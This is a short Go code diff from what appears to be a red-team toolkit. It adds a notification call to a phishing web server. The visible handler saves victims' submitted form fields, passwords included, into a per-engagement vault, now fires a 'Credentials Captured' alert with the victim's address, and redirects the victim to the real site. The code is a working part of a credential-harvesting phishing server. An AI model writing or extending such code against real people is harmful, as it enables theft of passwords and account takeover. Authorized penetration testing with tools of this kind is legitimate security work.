@@ -12,6 +12,7 @@ import (
 
 	"github.com/bryanparreira/davoid/internal/engagement"
 	"github.com/bryanparreira/davoid/internal/modules/ui"
+	"github.com/bryanparreira/davoid/internal/notify"
 	"github.com/bryanparreira/davoid/internal/targets"
 	"github.com/bryanparreira/davoid/internal/vault"
 )
@@ -97,6 +98,9 @@ func Run() error {
 					vault.Save(eng.ID, "phishing", r.RemoteAddr, k, strings.Join(v, ","), "password")
 				}
 			}
+			notify.Fire(notify.EventCredsCaptured,
+				"Credentials Captured",
+				fmt.Sprintf("Phishing hit from %s: %s", r.RemoteAddr, entry))
 			// Redirect victim to real site
 			http.Redirect(w, r, target, http.StatusFound)
 			return
